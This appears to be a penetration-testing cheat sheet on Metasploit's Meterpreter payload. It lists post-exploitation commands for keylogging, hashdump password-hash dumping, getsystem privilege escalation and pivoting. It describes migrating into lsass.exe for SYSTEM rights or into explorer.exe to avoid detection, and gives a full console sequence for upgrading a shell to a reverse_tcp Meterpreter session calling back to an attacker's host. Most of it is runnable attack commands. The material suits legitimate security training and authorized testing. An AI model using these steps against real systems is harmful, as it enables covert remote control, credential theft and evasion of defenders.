Meterpreter is an advanced and flexible payload used in **Metasploit Framework**, designed for post-exploitation tasks after successfully exploiting a target system. It allows attackers (or ethical hackers) to interact with and control the compromised system remotely, offering numerous features for pivoting, escalation, and lateral movement.

## Common Meterpreter Commands

1. **Basic Commands**:
- `sysinfo`: Displays system information (OS, architecture, logged-in users).
- `getuid`: Displays the current user ID.
- `shell`: Opens a system shell for further command execution.
- `background`: Sends the current session to the background, allowing you to use other Metasploit commands.
2. **File Management**:
- `upload <local_path> <remote_path>`: Uploads files to the target system.
- `download <remote_path> <local_path>`: Downloads files from the target system.
3. **Network & Post-Exploitation**:
- `portfwd`: Forwards ports between the target machine and the attacker's machine.
- `route`: Manages routes for pivoting through compromised systems to reach other targets on the same network.
4. **Privilege Escalation**:      
- `getsystem`: Attempts to escalate privileges to SYSTEM.
- `migrate`: Migrates the Meterpreter session to another process (often a more stable one).
5. **Keylogging**:    
- `keyscan_start`: Starts logging keystrokes on the victim's system.
- `keyscan_dump`: Displays the captured keystrokes.
6. **Password Dumping**:
- `hashdump`: Dumps the hashes of the local user accounts from the target system. This is useful for offline cracking of password hashes.

## Process migration
**Process migration** in exploitation involves moving a Meterpreter session from the process where the initial payload is running to a more stable or advantageous process on the target system. This is typically done to maintain session stability, evade detection, or elevate privileges. When migrating to a process like `lsass.exe`, the session inherits the process's privileges, which are often at the highest level (NT AUTHORITY\SYSTEM).

In contrast, migrating to other processes, such as `explorer.exe`, may not elevate privileges but can serve as a means of camouflaging the session within a less monitored or critical process. 

Privilege escalation can also be achieved using the `getsystem` command after migrating or stabilizing the session. This command attempts various techniques to elevate the session to NT AUTHORITY\SYSTEM privileges. 

#### Execution
1. **Search for a Specific Process**
```bash
meterpreter > pgrep lsass
# Or
meterpreter > pgrep explorer
# Or
meterpreter > ps
```
This will return the PID of the `lsass.exe` or `explorer.exe` process.

2. **Migrate to the Desired Process**
```bash
meterpreter > migrate <PID>
```


## Ensuring correct payload
Verify that you are using the correct payload that matches the architecture of the target system (32-bit vs. 64-bit). For instance:
- For 32-bit systems, use `windows/meterpreter/reverse_tcp`.
- For 64-bit systems, use `windows/x64/meterpreter/reverse_tcp`.

If the wrong payload is used, you may establish a connection but fail to create the Meterpreter session, as the payload will not be compatible with the target architecture.

## Upgrading Command Shells to Meterpreter Shells 

The `shell_to_meterpreter` module in Metasploit is specifically designed to upgrade a basic command shell to a Meterpreter shell. This method works by injecting a Meterpreter payload into the target system.

```bash
# Exit from the shell session using Ctrl+Z
use post/multi/manage/shell_to_meterpreter
# Specify the session ID of the command shell you want to upgrade.
set session <session_id>
# Choose an appropriate Meterpreter payload.
set payload windows/meterpreter/reverse_tcp
set lhost <your_ip>
set lport <your_port>
run
```

Another easy way of upgrading a command shell to a Meterpreter shell is the following one:
```bash
# Exit from the shell session using Ctrl+Z
sessions -u <session_id>
```